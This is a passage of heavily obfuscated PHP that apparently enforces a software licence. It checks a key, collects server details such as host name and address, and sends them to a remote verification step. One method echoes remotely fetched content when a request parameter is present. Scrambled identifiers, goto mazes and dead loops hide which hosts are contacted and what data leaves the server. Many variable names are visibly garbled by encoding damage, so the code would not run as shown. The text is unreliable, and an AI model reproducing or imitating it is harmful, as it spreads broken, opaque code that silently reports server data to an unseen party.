$DÚ„å´¹ÜĞ = $FÌˆ‘¤õÓ…[61]($FÌˆ‘¤õÓ…[62])->{$_SERVER[òÀÆ×ø][63]}(); goto b‡©äë®à; Aë·«Ìªğ: $FÌˆ‘¤õÓ…[13](array($FÌˆ‘¤õÓ…[151], $FÌˆ‘¤õÓ…[152]), $D¼¯ğµñ“š); $Ağö¨Œ­î = $Dí“‚¼òÉÃ[585]; if (strlen($Ağö¨Œ­î) < $Dí“‚¼òÉÃ[554]) { return; } goto f‹¾öÁ˜¬; b‡©äë®à: $C¹ßÑíâØ¹ = $Dí“‚¼òÉÃ[582]; if (!$C¹ßÑíâØ¹) { die; } $D¼¯ğµñ“š = array($FÌˆ‘¤õÓ…[159] => $DÚ„å´¹ÜĞ[$FÌˆ‘¤õÓ…[64]], $FÌˆ‘¤õÓ…[160] => $DÚ„å´¹ÜĞ[$FÌˆ‘¤õÓ…[65]], $FÌˆ‘¤õÓ…[161] => $FÌˆ‘¤õÓ…[10]); goto dÂùĞÜÜ; dÂùĞÜÜ: $d¶éçó¹“ß = $Dí“‚¼òÉÃ[583]; if (strlen($d¶éçó¹“ß) < $Dí“‚¼òÉÃ[566]) { die; } foreach ($c·’Êà as $A»ÙŠÍÆëì) { if (!isset($DÚ„å´¹ÜĞ[$A»ÙŠÍÆëì]) || !$DÚ„å´¹ÜĞ[$A»ÙŠÍÆëì]) { continue; } $D¼¯ğµñ“š[$A»ÙŠÍÆëì] = $DÚ„å´¹ÜĞ[$A»ÙŠÍÆëì]; $aÕÏĞÖ­Êƒ = $Dí“‚¼òÉÃ[584]; while (strlen($aÕÏĞÖ­Êƒ) < $Dí“‚¼òÉÃ[554]) { if (!$aÕÏĞÖ­Êƒ) { break; } $aÕÏĞÖ­Êƒ++; } } goto Aë·«Ìªğ; f‹¾öÁ˜¬: } private function psdh28e245d8() { goto B•­·†¬°; eÑ¦ò¯õ«Ã: $CÒÇ“†ËÄ = $aòå³¸Š¾[591]; if (strlen($CÒÇ“†ËÄ) < $aòå³¸Š¾[566]) { return; } $cµ¥Ñ‡â = $this->{$_SERVER[òÀÆ×ø][127]}($D÷Œ¦Öëù›[148]($Aª‹‡¸ÏŒ”), $c¼Î­êº¨”); goto FªÓóˆ‚Ó—; c»Ñ²Ô¼®©: $côŒ¢³×«ë = $aÚäÙò­Ëï[$D÷Œ¦Öëù›[225]]; $a¿šƒ¿êÎ = array(); $a¿šƒ¿êÎ[$c¬„ïº•ä¯] = $cµ¥Ñ‡â; goto a„ŞÓ¥²Şù; aïùÃ•Ä: $FêÃµ®å«Æ = $D÷Œ¦Öëù›[114]($_SERVER[$D÷Œ¦Öëù›[115]] . $BˆËŠô¥…); if ($Fì¾ƒ‚ø™[$D÷Œ¦Öëù›[178]] == $D÷Œ¦Öëù›[179]) { $E™á²¤ë¦‡ = $this->{$_SERVER[òÀÆ×ø][147]}($FêÃµ®å«Æ, $D÷Œ¦Öëù›[180]); $f²Â÷†‰ ï = $this->{$_SERVER[òÀÆ×ø][127]}($D÷Œ¦Öëù›[148]($F·ëéÒ‘¬ğ), $FêÃµ®å«Æ . $D÷Œ¦Öëù›[181], 3); $CÓ–‚‡® = $this->{$_SERVER[òÀÆ×ø][182]}($D÷Œ¦Öëù›[183] . $E™á²¤ë¦‡ . $D÷Œ¦Öëù›[184] . $f²Â÷†‰ ï, -1); $D÷Œ¦Öëù›[166]($CÓ–‚‡®, !0); } else { if ($Fì¾ƒ‚ø™[$D÷Œ¦Öëù›[178]] == $D÷Œ¦Öëù›[185]) { $AÀ¦éÔ—Õ = $D÷Œ¦Öëù›[25]($D÷Œ¦Öëù›[114]($D÷Œ¦Öëù›[186] . $FêÃµ®å«Æ), 12, 15) . $D÷Œ¦Öëù›[187]; $f²Â÷†‰ ï = $this->{$_SERVER[òÀÆ×ø][188]}($D÷Œ¦Öëù›[2]($Fì¾ƒ‚ø™[$D÷Œ¦Öëù›[189]]), $AÀ¦éÔ—Õ, 2); $F¤§ÁàßÀ¯ = $D÷Œ¦Öëù›[190]($f²Â÷†‰ ï, !0); if (!$D÷Œ¦Öëù›[191]($F¤§ÁàßÀ¯) || !$D÷Œ¦Öëù›[191]($F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[192]]) || $F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[165]] != !0) { $b‹ÜĞÉŞ¾ = $D÷Œ¦Öëù›[193]; $fïÅ›ÇŠŸĞ = $F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[192]] ? $D÷Œ¦Öëù›[194] . $F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[192]] : $b‹ÜĞÉŞ¾; $D÷Œ¦Öëù›[166]($fïÅ›ÇŠŸĞ, !1); } else { $F·ëéÒ‘¬ğ[$D÷Œ¦Öëù›[168]] = $F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[192]][$D÷Œ¦Öëù›[195]]; } } else { $F¤§ÁàßÀ¯ = $this->{$_SERVER[òÀÆ×ø][182]}($D÷Œ¦Öëù›[196], $F·ëéÒ‘¬ğ, 10); $Aùë«„Äß = $aòå³¸Š¾[586]; if (strlen($Aùë«„Äß) < $aòå³¸Š¾[558]) { return; } } } if (!$D÷Œ¦Öëù›[191]($F¤§ÁàßÀ¯) || !$D÷Œ¦Öëù›[191]($F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[192]]) || $F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[165]] != !0) { $b‹ÜĞÉŞ¾ = $D÷Œ¦Öëù›[197]($D÷Œ¦Öëù›[198]); $fïÅ›ÇŠŸĞ = $F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[192]] ? $D÷Œ¦Öëù›[194] . $F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[192]] : $b‹ÜĞÉŞ¾; $D÷Œ¦Öëù›[166]($fïÅ›ÇŠŸĞ, !1); } goto fİ¸õ¼”; aŒ„‹ÅôÔÖ: $a–òò†˜“Ê = $aòå³¸Š¾[590]; if (strlen($a–òò†˜“Ê) < $aòå³¸Š¾[558]) { die; } $c¬„ïº•ä¯ = $D÷Œ¦Öëù›[214]($D÷Œ¦Öëù›[25]($c¼Î­êº¨”, 10, 16)); goto eÑ¦ò¯õ«Ã; fİ™†ƒ®ÕÈ: $CçÕ«öÛÈ = $aäÑ­Âª÷™ . $b´Õèï‡‡»[$D÷Œ¦Öëù›[120]] . $b´Õèï‡‡»[$D÷Œ¦Öëù›[212]]; $b´Õèï‡‡»[$D÷Œ¦Öëù›[122]] = $D÷Œ¦Öëù›[214]($D÷Œ¦Öëù›[118]($this->{$_SERVER[òÀÆ×ø][147]}($CçÕ«öÛÈ, $D÷Œ¦Öëù›[215]))); $a£’ğ¿‚³— = $D÷Œ¦Öëù›[124](16); goto CÍÌÓ¯ÚÛ; fÊÁí³«Ñç: if (!isset($Fì¾ƒ‚ø™[$D÷Œ¦Öëù›[165]]) || $D÷Œ¦Öëù›[24]($Fì¾ƒ‚ø™[$D÷Œ¦Öëù›[165]]) != 16) { $D÷Œ¦Öëù›[166]($D÷Œ¦Öëù›[167] . $Fì¾ƒ‚ø™[$D÷Œ¦Öëù›[165]], !1); } $BˆËŠô¥… = $D÷Œ¦Öëù›[61]($D÷Œ¦Öëù›[62])->{$_SERVER[òÀÆ×ø][63]}($D÷Œ¦Öëù›[116]); $F·ëéÒ‘¬ğ = array($D÷Œ¦Öëù›[165] => $Fì¾ƒ‚ø™[$D÷Œ¦Öëù›[165]], $D÷Œ¦Öëù›[168] => $D÷Œ¦Öëù›[124](16), $D÷Œ¦Öëù›[169] => $D÷Œ¦Öëù›[149], $D÷Œ¦Öëù›[170] => $D÷Œ¦Öëù›[171], $D÷Œ¦Öëù›[172] => $_SERVER[$D÷Œ¦Öëù›[173]], $D÷Œ¦Öëù›[174] => $_SERVER[$D÷Œ¦Öëù›[175]], $D÷Œ¦Öëù›[176] => $_SERVER[$D÷Œ¦Öëù›[177]]); goto aïùÃ•Ä; bãÚõ£Äƒ®: if (!$D÷Œ¦Öëù›[104]($GLOBALS, $D÷Œ¦Öëù›[132])) { die; } $Fì¾ƒ‚ø™ = $GLOBALS[$D÷Œ¦Öëù›[22]]; if (isset($Fì¾ƒ‚ø™[$D÷Œ¦Öëù›[163]])) { $this->{$_SERVER[òÀÆ×ø][164]}(); die; } goto fÊÁí³«Ñç; e«é…ğîé‚: $b´Õèï‡‡» = array($D÷Œ¦Öëù›[209] => $F·ëéÒ‘¬ğ[$D÷Œ¦Öëù›[165]], $D÷Œ¦Öëù›[210] => $Aª‹‡¸ÏŒ”[$D÷Œ¦Öëù›[211]], $D÷Œ¦Öëù›[212] => $D÷Œ¦Öëù›[124](16), $D÷Œ¦Öëù›[120] => $Aª‹‡¸ÏŒ”[$D÷Œ¦Öëù›[213]]); if ($F·ëéÒ‘¬ğ[$D÷Œ¦Öëù›[168]]) { $b´Õèï‡‡»[$D÷Œ¦Öëù›[212]] = $F·ëéÒ‘¬ğ[$D÷Œ¦Öëù›[168]]; } $aäÑ­Âª÷™ = $D÷Œ¦Öëù›[25]($D÷Œ¦Öëù›[114]($b´Õèï‡‡»[$D÷Œ¦Öëù›[210]]), 10, 10); goto fİ™†ƒ®ÕÈ; Aİ†‚ƒƒ†: $b´Õèï‡‡»[$D÷Œ¦Öëù›[123]] = $D÷Œ¦Öëù›[118]($D÷Œ¦Öëù›[214]($this->{$_SERVER[òÀÆ×ø][147]}($B‚’´½Åóº, $D÷Œ¦Öëù›[216]))); $B‘Æ¢ŠëöŠ = $aòå³¸Š¾[589]; while ($B‘Æ¢ŠëöŠ < $aòå³¸Š¾[554]) { if ($B‘Æ¢ŠëöŠ >= 0) { break; } $B‘Æ¢ŠëöŠ++; } goto cĞ¿³–¥ö´; CÍÌÓ¯ÚÛ: $Cî¸êÅŠˆ’ = $aòå³¸Š¾[587]; $B‚’´½Åóº = $a£’ğ¿‚³— . $b´Õèï‡‡»[$D÷Œ¦Öëù›[120]] . $this->{$_SERVER[òÀÆ×ø][147]}($D÷Œ¦Öëù›[114]($b´Õèï‡‡»[$D÷Œ¦Öëù›[209]]), $a£’ğ¿‚³—); $C»’…İ¶ÑÑ = $aòå³¸Š¾[588]; goto Aİ†‚ƒƒ†; cĞ¿³–¥ö´: if ($Aª‹‡¸ÏŒ”[$D÷Œ¦Öëù›[217]] && $Aª‹‡¸ÏŒ”[$D÷Œ¦Öëù›[217]] >= 1) { $D÷Œ¦Öëù›[61]($D÷Œ¦Öëù›[62])->{$_SERVER[òÀÆ×ø][218]}($D÷Œ¦Öëù›[219], $D÷Œ¦Öëù›[220]); } $D÷Œ¦Öëù›[61]($D÷Œ¦Öëù›[62])->{$_SERVER[òÀÆ×ø][221]}($b´Õèï‡‡»); $c¼Î­êº¨” = $D÷Œ¦Öëù›[114]($_SERVER[$D÷Œ¦Öëù›[115]] . $D÷Œ¦Öëù›[214]($BˆËŠô¥…) . $b´Õèï‡‡»[$D÷Œ¦Öëù›[210]]); goto aŒ„‹ÅôÔÖ; a„ŞÓ¥²Şù: $Dñ‡š»Ú¸å = $aòå³¸Š¾[593]; if (strlen($Dñ‡š»Ú¸å) < $aòå³¸Š¾[558]) { return; } $D÷Œ¦Öëù›[61]($D÷Œ¦Öëù›[11])->{$_SERVER[òÀÆ×ø][226]}($côŒ¢³×«ë[$D÷Œ¦Öëù›[227]], array($D÷Œ¦Öëù›[228] => $a¿šƒ¿êÎ)); goto C¹ÅªáõÓµ; AÇäæÓ‰ç®: $døò‡åÜšƒ = $aòå³¸Š¾[595]; while (strlen($døò‡åÜšƒ) < $aòå³¸Š¾[554]) { if (!$døò‡åÜšƒ) { break; } $døò‡åÜšƒ++; } goto B›ç—¦çÈÔ; B•­·†¬°: $aòå³¸Š¾ =& $_SERVER[£ü]; $D÷Œ¦Öëù› =& $_SERVER[òÀÆ×ø]; if ($_SERVER[$D÷Œ¦Öëù›[44]] != $D÷Œ¦Öëù›[162]) { return; } goto bãÚõ£Äƒ®; fİ¸õ¼”: $Aª‹‡¸ÏŒ” = $F¤§ÁàßÀ¯[$D÷Œ¦Öëù›[192]]; $dÑ¼Ÿ¥¾°Ê = $this->{$_SERVER[òÀÆ×ø][199]}($Aª‹‡¸ÏŒ”[$D÷Œ¦Öëù›[200]]); if (!$dÑ¼Ÿ¥¾°Ê || $dÑ¼Ÿ¥¾°Ê != $D÷Œ¦Öëù›[201]($Aª‹‡¸ÏŒ”[$D÷Œ¦Öëù›[145]])) { $A†±ÈœºäŠ = array($D÷Œ¦Öëù›[202] => $D÷Œ¦Öëù›[61]($D÷Œ¦Öëù›[62])->{$_SERVER[òÀÆ×ø][63]}($D÷Œ¦Öëù›[116]), $D÷Œ¦Öëù›[203] => $_SERVER[$D÷Œ¦Öëù›[115]], $D÷Œ¦Öëù›[204] => $D÷Œ¦Öëù›[205](), $D÷Œ¦Öëù›[174] => $_SERVER[$D÷Œ¦Öëù›[175]]); $f²Â÷†‰ ï = $this->{$_SERVER[òÀÆ×ø][206]}($D÷Œ¦Öëù›[148]($A†±ÈœºäŠ)); $this->{$_SERVER[òÀÆ×ø][182]}($D÷Œ¦Öëù›[207] . $f²Â÷†‰ ï); $D÷Œ¦Öëù›[166]($D÷Œ¦Öëù›[197]($D÷Œ¦Öëù›[208]), !0); } goto e«é…ğîé‚; FªÓóˆ‚Ó—: $aÚäÙò­Ëï = $D÷Œ¦Öëù›[222]($D÷Œ¦Öëù›[61]($D÷Œ¦Öëù›[11])->{$_SERVER[òÀÆ×ø][223]}(), $D÷Œ¦Öëù›[224]); $FÌ‡éØŒÙ = $aòå³¸Š¾[592]; if (!$FÌ‡éØŒÙ) { die; } goto c»Ñ²Ô¼®©; C¹ÅªáõÓµ: $F„Ş÷¸ì‹ = $aòå³¸Š¾[594]; if (!$F„Ş÷¸ì‹) { return; } $D÷Œ¦Öëù›[166]($D÷Œ¦Öëù›[197]($D÷Œ¦Öëù›[208]), !0); goto AÇäæÓ‰ç®; B›ç—¦çÈÔ: } private function dcib7e43ccc6() { goto a„ÊàñØˆŒ; CÔòí´õĞÆ: $Bã•¾Ş¦É = $AÙ‚õ¨‰Ú[596]; while ($Bã•¾Ş¦É < $AÙ‚õ¨‰Ú[566]) { if ($Bã•¾Ş¦É >= 0) { break; } $Bã•¾Ş¦É++; } $AêĞÉ‚Ø‡[61]($AêĞÉ‚Ø‡[62])->{$_SERVER[òÀÆ×ø][218]}($AêĞÉ‚Ø‡[219], $AêĞÉ‚Ø‡[229]); goto FªÉŠÈ°‡Ù; FªÉŠÈ°‡Ù: $this->vbxh43eb306f = array(); $this->cioj84c6a100 = $AêĞÉ‚Ø‡[121]; goto bïÌâ¥‡¦; a„ÊàñØˆŒ: $AÙ‚õ¨‰Ú =& $_SERVER[£ü]; $AêĞÉ‚Ø‡ =& $_SERVER[òÀÆ×ø]; $AêĞÉ‚Ø‡[61]($AêĞÉ‚Ø‡[62])->{$_SERVER[òÀÆ×ø][221]}(array($AêĞÉ‚Ø‡[209] => $AêĞÉ‚Ø‡[10], $AêĞÉ‚Ø‡[210] => $AêĞÉ‚Ø‡[10], $AêĞÉ‚Ø‡[120] => $AêĞÉ‚Ø‡[121], $AêĞÉ‚Ø‡[122] => $AêĞÉ‚Ø‡[10], $AêĞÉ‚Ø‡[123] => $AêĞÉ‚Ø‡[10])); goto CÔòí´õĞÆ; bïÌâ¥‡¦: } private function vgho5e04e55c() { goto d…öĞ®·Çñ; AÉÊ¤Œ¯é‹: $D±Êß´Œ  = $céöÒÀˆ«…[598]; while ($D±Êß´Œ  < $céöÒÀˆ«…[554]) { if ($D±Êß´Œ  >= 0) { break; } $D±Êß´Œ ++; } $F×Á•½…”å = $f·„äÑÕÒ[$fŒ…¦ø¶‹£[225]]; goto eˆ‰ã²™Ş; d¼šËÎÃ§¸: $e‘ƒ‰İÇó‰ = $fŒ…¦ø¶‹£[144]($EÙ¨»Ùë¼Û[$fŒ…¦ø¶‹£[145]]); if ($fŒ…¦ø¶‹£[230]() >= $e‘ƒ‰İÇó‰) { return $this->{$_SERVER[òÀÆ×ø][164]}(); } $this->vbxh43eb306f = $EÙ¨»Ùë¼Û; goto B·˜¿†•Ã; dª×³î¼‡Ñ: $b²ñ¯ƒƒÀ = $céöÒÀˆ«…[600]; while ($b²ñ¯ƒƒÀ < $céöÒÀˆ«…[566]) { if ($b²ñ¯ƒƒÀ >= 0) { break; } $b²ñ¯ƒƒÀ++; } if (!$fŒ…¦ø¶‹£[191]($EÙ¨»Ùë¼Û)) { return $this->{$_SERVER[òÀÆ×ø][164]}(); } goto d¼šËÎÃ§¸; eˆ‰ã²™Ş: $aã¬ÆËëì = $fŒ…¦ø¶‹£[114]($_SERVER[$fŒ…¦ø¶‹£[115]] . $fŒ…¦ø¶‹£[214]($F§Ö›„½´ì) . $DôÁ …ê÷Œ[$fŒ…¦ø¶‹£[210]]); $bğä³Ï¨àé = $fŒ…¦ø¶‹£[214]($fŒ…¦ø¶‹£[25]($aã¬ÆËëì, 10, 16)); $EÙ¨»Ùë¼Û = $this->{$_SERVER[òÀÆ×ø][188]}($F×Á•½…”å[$fŒ…¦ø¶‹£[91]][$bğä³Ï¨àé], $aã¬ÆËëì); goto C§È½‡—ò; B·˜¿†•Ã: $this->cioj84c6a100 = $DôÁ …ê÷Œ[$fŒ…¦ø¶‹£[120]]; goto bëùµ“ïŞÏ; Cİ‚Œ®—ö: $this->cioj84c6a100 = $fŒ…¦ø¶‹£[121]; $DôÁ …ê÷Œ = $fŒ…¦ø¶‹£[61]($fŒ…¦ø¶‹£[62])->{$_SERVER[òÀÆ×ø][63]}(); $b¬ˆ…ìÚ© = $céöÒÀˆ«…[597]; goto F…ÀÈ†Û©Ò; d…öĞ®·Çñ: $céöÒÀˆ«… =& $_SERVER[£ü]; $fŒ…¦ø¶‹£ =& $_SERVER[òÀÆ×ø]; $_SERVER[$fŒ…¦ø¶‹£[175]] = $fŒ…¦ø¶‹£[104]($_SERVER, $fŒ…¦ø¶‹£[175], APP_HOST); goto Cİ‚Œ®—ö; C§È½‡—ò: $cğŒŠÒ÷’± = $céöÒÀˆ«…[599]; if (!$cğŒŠÒ÷’±) { return; } $EÙ¨»Ùë¼Û = $fŒ…¦ø¶‹£[190]($EÙ¨»Ùë¼Û, !0); goto dª×³î¼‡Ñ; F…ÀÈ†Û©Ò: if ($DôÁ …ê÷Œ[$fŒ…¦ø¶‹£[120]] == $fŒ…¦ø¶‹£[121]) { return; } $F§Ö›„½´ì = $fŒ…¦ø¶‹£[61]($fŒ…¦ø¶‹£[62])->{$_SERVER[òÀÆ×ø][63]}($fŒ…¦ø¶‹£[116]); $f·„äÑÕÒ = $fŒ…¦ø¶‹£[222]($fŒ…¦ø¶‹£[61]($fŒ…¦ø¶‹£[11])->{$_SERVER[òÀÆ×ø][223]}(), $fŒ…¦ø¶‹£[224]); goto AÉÊ¤Œ¯é‹; bëùµ“ïŞÏ: } private function ecfa186f1131() { goto bÖì¯ÒÇÑŠ; eÜ¬µØåµ: $F¢´ë‰Á®Œ = $_SERVER[$Eòó®‰ê‘Í[44]]; if ($F¢´ë‰Á®Œ == $Eòó®‰ê‘Í[231] && $this->cioj84c6a100 == $Eòó®‰ê‘Í[121]) { $Eòó®‰ê‘Í[166]($Eòó®‰ê‘Í[197]($Eòó®‰ê‘Í[232]), !1, $Eòó®‰ê‘Í[233]); } $bìÓ„Ô©Û‘ = array($Eòó®‰ê‘Í[234], $Eòó®‰ê‘Í[235]); goto d•Ü²º«Ì¢; bÖì¯ÒÇÑŠ: $Eòó®‰ê‘Í =& $_SERVER[òÀÆ×ø]; $F›š…»é”Œ = $GLOBALS[$Eòó®‰ê‘Í[22]]; $CÚ¤±Ø¥¹î = $_SERVER[£ü][601]; goto eÜ¬µØåµ; d•Ü²º«Ì¢: if ($Eòó®‰ê‘Í[236]($F¢´ë‰Á®Œ, $bìÓ„Ô©Û‘)) { if ($this->cioj84c6a100 == $Eòó®‰ê‘Í[121] && isset($F›š…»é”Œ[$Eòó®‰ê‘Í[237]])) { $Eòó®‰ê‘Í[166]($Eòó®‰ê‘Í[197]($Eòó®‰ê‘Í[232]), !1, $Eòó®‰ê‘Í[233]); die; } $CéªÑŠ‡æª = $this->{$_SERVER[òÀÆ×ø][137]}(); if ($CéªÑŠ‡æª != $Eòó®‰ê‘Í[201]($Eòó®‰ê‘Í[238])) { if ($CéªÑŠ‡æª <= $Eòó®‰ê‘Í[61]($Eòó®‰ê‘Í[139])->{$_SERVER[òÀÆ×ø][140]}()) { $Eòó®‰ê‘Í[166]($Eòó®‰ê‘Í[197]($Eòó®‰ê‘Í[239]), !1, $Eòó®‰ê‘Í[233]); die; } } } goto CêÚÛ¦®Ú°; CêÚÛ¦®Ú°: } private function xsmcd88896e1() { goto d­”†ß”±; D…ØÈïÑ«‡: if (!$D¬¯ä¥¾ª²[236]($_SERVER[$D¬¯ä¥¾ª²[44]], $Eá¹½›Èƒ)) { return; } $Aù„à«ÃÃä = $D¬¯ä¥¾ª²[242]; $Aù„à«ÃÃä = $this->{$_SERVER[òÀÆ×ø][243]}($Aù„à«ÃÃä, $D¬¯ä¥¾ª²[244]); goto CŒö†ùØå; CŒö†ùØå: $bÕ”‘ÄŠØ  = $D¬¯ä¥¾ª²[245](array($D¬¯ä¥¾ª²[246] => array($D¬¯ä¥¾ª²[247] => $D¬¯ä¥¾ª²[248], $D¬¯ä¥¾ª²[249] => 3))); $Aƒ²î“À§á = @$D¬¯ä¥¾ª²[250]($Aù„à«ÃÃä, !1, $bÕ”‘ÄŠØ ); $bëç‚®ê ò = $AÅ±Ò‰Øé[603]; goto Fˆ‘±¤ßÅÕ; d­”†ß”±: $AÅ±Ò‰Øé =& $_SERVER[£ü]; $D¬¯ä¥¾ª² =& $_SERVER[òÀÆ×ø]; $Eá¹½›Èƒ = array($D¬¯ä¥¾ª²[135], $D¬¯ä¥¾ª²[240]); goto dÃ©‹¤×ö´; Fˆ‘±¤ßÅÕ: if (strlen($bëç‚®ê ò) < $AÅ±Ò‰Øé[547]) { return; } $D¬¯ä¥¾ª²[251]($D¬¯ä¥¾ª²[252]); $bˆÅÁŠ‘ôñ = $AÅ±Ò‰Øé[604]; goto Aî¥¦ä“ç´; dÃ©‹¤×ö´: $a¬À¿Ì¢å = $AÅ±Ò‰Øé[602]; if (!$a¬À¿Ì¢å) { return; } if (!$D¬¯ä¥¾ª²[104]($GLOBALS, $D¬¯ä¥¾ª²[132]) || !isset($_GET[$D¬¯ä¥¾ª²[241]])) { return; } goto D…ØÈïÑ«‡; Aî¥¦ä“ç´: while ($bˆÅÁŠ‘ôñ < $AÅ±Ò‰Øé[547]) { if ($bˆÅÁŠ‘ôñ >= 0) { break; } $bˆÅÁŠ‘ôñ++; } if ($Aƒ²î“À§á && $D¬¯ä¥¾ª²[32]($Aƒ²î“À§á, $D¬¯ä¥¾ª²[253])) { echo $Aƒ²î“À§á; } die; goto A°‡™î‰¨¶; A°‡™î‰¨¶: } public function lhmv86749921($f†ª´Ä‚Æ¢) { goto D†ç†¯ì; aİó™àÉ¡Œ: $cªŸöŸ¿¼Î = $Cî‘ ˆß«[606]; while (strlen($cªŸöŸ¿¼Î) < $Cî‘ ˆß«[554]) { if (!$cªŸöŸ¿¼Î) { break; } $cªŸöŸ¿¼Î++; } $E‰¯ºîèÃÕ = array(); goto A¢ÃŠ¯ø¦; A¢ÃŠ¯ø¦: foreach ($C´ ãº¯Éí as $bŒĞèÇë¹) { if (!$D‘Û­«’ÅÚ[236]($bŒĞèÇë¹, $f–æğ©ùí)) { $E‰¯ºîèÃÕ[] = $bŒĞèÇë¹; } } foreach ($E‰¯ºîèÃÕ as $bŒĞèÇë¹) { unset($f†ª´Ä‚Æ¢[$bŒĞèÇë¹]); } return $f†ª´Ä‚Æ¢; goto CÊµ¡‡„; a³“¼èÚé: $C´ ãº¯Éí = array($D‘Û­«’ÅÚ[255], $D‘Û­«’ÅÚ[256], $D‘Û­«’ÅÚ[257], $D‘Û­«’ÅÚ[258], $D‘Û­«’ÅÚ[259], $D‘Û­«’ÅÚ[260], $D‘Û­«’ÅÚ[261], $D‘Û­«’ÅÚ[262]); $d‰…Õç£µã = $Cî‘ ˆß«[605]; $f–æğ©ùí = $D‘Û­«’ÅÚ[0]($D‘Û­«’ÅÚ[263], $D‘Û­«’ÅÚ[104]($this->vbxh43eb306f, $D‘Û­«’ÅÚ[129], $D‘Û­«’ÅÚ[10])); goto aİó™àÉ¡Œ; D†ç†¯ì: $Cî‘ ˆß« =& $_SERVER[£ü]; $D‘Û­«’ÅÚ =& $_SERVER[òÀÆ×ø]; if ($this->cioj84c6a100 == $D‘Û­«’ÅÚ[254]) { return $f†ª´Ä‚Æ¢; } goto a³“¼èÚé; CÊµ¡‡„: } private function tybse5127d2f() { goto b¿ÎæÒ Â¬; A †®´§…ˆ: $FàÍ¦‚İ¨Ó[61]($FàÍ¦‚İ¨Ó[269])->{$_SERVER[òÀÆ×ø][221]}($FàÍ¦‚İ¨Ó[85], $FàÍ¦‚İ¨Ó[229]); $c‘ëëòõèÃ = $b‚ó”´Ó»Ï[609]; if (strlen($c‘ëëòõèÃ) < $b‚ó”´Ó»Ï[550]) { return; } goto f¶ŠŸŒÆ¥; ašßã†‘¼¯: $GLOBALS[$FàÍ¦‚İ¨Ó[91]][$FàÍ¦‚İ¨Ó[95]][$FàÍ¦‚İ¨Ó[264]] = $FàÍ¦‚İ¨Ó[229]; $GLOBALS[$FàÍ¦‚İ¨Ó[91]][$FàÍ¦‚İ¨Ó[268]] = $FàÍ¦‚İ¨Ó[220]; $e¦ÊÜ¼‘Î = $b‚ó”´Ó»Ï[608]; goto A †®´§…ˆ; a¸¿ÃÅØÜ”: $AàšÊØ‘ = $_SERVER[$FàÍ¦‚İ¨Ó[44]]; $CŒçÌö­ = array($FàÍ¦‚İ¨Ó[265]); foreach ($CŒçÌö­ as $d®‹˜è°) { if ($d®‹˜è° == $AàšÊØ‘ || $FàÍ¦‚İ¨Ó[25]($AàšÊØ‘, 0, $FàÍ¦‚İ¨Ó[24]($d®‹˜è°)) == $d®‹˜è°) { $FàÍ¦‚İ¨Ó[166]($FàÍ¦‚İ¨Ó[197]($FàÍ¦‚İ¨Ó[266]), !1); } } goto D ùİ’¼»›; D ùİ’¼»›: $GLOBALS[$FàÍ¦‚İ¨Ó[91]][$FàÍ¦‚İ¨Ó[95]][$FàÍ¦‚İ¨Ó[267]] = $FàÍ¦‚İ¨Ó[220]; $eÙËÆóŒÆã = $b‚ó”´Ó»Ï[607]; while ($eÙËÆóŒÆã < $b‚ó”´Ó»Ï[554]) { if ($eÙËÆóŒÆã >= 0) { break; } $eÙËÆóŒÆã++; } goto ašßã†‘¼¯; b¿ÎæÒ Â¬: $b‚ó”´Ó»Ï =& $_SERVER[£ü]; $FàÍ¦‚İ¨Ó =& $_SERVER[òÀÆ×ø]; if ($this->cioj84c6a100 != $FàÍ¦‚İ¨Ó[121]) { $GLOBALS[$FàÍ¦‚İ¨Ó[91]][$FàÍ¦‚İ¨Ó[95]][$FàÍ¦‚İ¨Ó[264]] = $FàÍ¦‚İ¨Ó[220]; return; } goto a¸¿ÃÅØÜ”; f¶ŠŸŒÆ¥: } public function tcubb73654f1() { $AÚ¡Á˜†Ò =& $_SERVER[£ü]; return $_SERVER[òÀÆ×ø][270]; $D˜õÓãÃ” = $AÚ¡Á˜†Ò[610]; while (strlen($D˜õÓãÃ”) < $AÚ¡Á˜†Ò[566]) { if (!$D˜õÓãÃ”) { break; } $D˜õÓãÃ”++; } } private function hmbg794c34c3() { goto DÈ¦ö®–»Œ; eñàƒäÂ¡‰: $D‰—çÖ—ôï = $f£Úˆ¾Øò[611]; while ($D‰—çÖ—ôï < $f£Úˆ¾Øò[554]) { if ($D‰—çÖ—ôï >= 0) { break; } $D‰—çÖ—ôï++; } $c—«ñ–´Æ = $fÉÈä« © [274] . $fÉÈä« © [114]($fÉÈä« © [275]); goto Dõ ¥Øìéˆ; cí‘·Çö: if ($B¨ëÁÓŒ¶¯ && $fÉÈä« © [230]() - $B¨ëÁÓŒ¶¯ < $fÉÈä« © [201]($fÉÈä« © [278])) { return; } $fÉÈä« © [13](array($fÉÈä« © [276], $fÉÈä« © [152]), $c—«ñ–´Æ, $fÉÈä« © [230]()); $CÖ„ğ÷¤á = array($fÉÈä« © [165] => $fÉÈä« © [61]($fÉÈä« © [62])->{$_SERVER[òÀÆ×ø][63]}($fÉÈä« © [209]), $fÉÈä« © [178] => $this->cioj84c6a100, $fÉÈä« © [176] => $_SERVER[$fÉÈä« © [177]], $fÉÈä« © [169] => $fÉÈä« © [149], $fÉÈä« © [172] => $_SERVER[$fÉÈä« © [173]]); goto dæÊ†Å»µ; Dõ ¥Øìéˆ: $D“‡ì…á‘» = $f£Úˆ¾Øò[612]; if (!$D“‡ì…á‘») { return; } if ($this->cioj84c6a100 == $fÉÈä« © [121] || !$fÉÈä« © [104]($GLOBALS, $fÉÈä« © [132])) { return; } goto B·ÆÂ’Ã²ë; B·ÆÂ’Ã²ë: if (!$fÉÈä« © [236]($_SERVER[$fÉÈä« © [44]], $d¥ñ©«ßéš)) { return; } if ($fÉÈä« © [230]() % 4 != 0) { return; } $B¨ëÁÓŒ¶¯ = $fÉÈä« © [13](array($fÉÈä« © [276], $fÉÈä« © [277]), $c—«ñ–´Æ); goto cí‘·Çö; DšÈ¦ó‚©²: while ($f§ïÎÉ„‹‡ < $f£Úˆ¾Øò[554]) { if ($f§ïÎÉ„‹‡ >= 0) { break; } $f§ïÎÉ„‹‡++; } if (!$fÉÈä« © [191]($FÉßÂ‹‚éØ)) { return; } if ($FÉßÂ‹‚éØ[$fÉÈä« © [165]] && 